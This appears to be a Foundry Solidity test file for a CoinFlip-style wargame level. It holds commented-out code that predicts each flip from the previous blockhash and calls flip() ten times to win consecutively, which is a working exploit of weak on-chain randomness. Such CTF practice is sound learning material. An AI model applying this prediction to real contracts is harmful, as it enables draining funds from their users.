// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract Level3Test is Test {
    address addr = 0xd7ef7D5c0C55914eabA7e7f5aF27FA89Cd292b17;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {}

    // function test_Flip() public {
    //     (bool c, bytes memory d) = address(addr).call(abi.encodeWithSignature("consecutiveWins()"));
    //     assertEq(c, true);
    //     uint256 t = abi.decode(d, (uint256));
    //     console.log(t, "t");
    // }
    // function test_Flip() public {
    //     for (uint256 i = 0; i < 10; i++) {
    //         uint256 blockValue = uint256(blockhash(block.number - 1));
    //         uint256 coinFlip = blockValue / FACTOR;
    //         bool side = coinFlip == 1 ? true : false;
    //         (bool b,) = address(addr).call(abi.encodeWithSignature("flip(bool)", side));
    //         assertEq(b, true);
    //     }
    //     (bool c, bytes memory d) = address(addr).call(abi.encodeWithSignature("consecutiveWins()"));
    //     assertEq(c, true);

    //     uint256 t = abi.decode(d, (uint256));
    //     assertEq(t, 10);
    // }
}
